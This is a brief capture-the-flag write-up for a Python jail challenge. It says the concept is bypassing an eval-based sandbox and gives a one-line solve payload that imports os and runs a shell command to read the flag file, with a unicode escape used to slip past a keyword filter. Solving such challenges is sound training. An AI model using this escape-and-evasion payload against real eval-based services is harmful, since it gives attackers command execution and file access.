## URL
https://ctf.sigpwny.com/challenges#Meetings/Pyjail%200.5-630

## Concept 
BY passing the eval function from the source code

## Method of solve
~~~
print(__import__('os').popen('cat /fl\u0061g.txt').read())
~~~
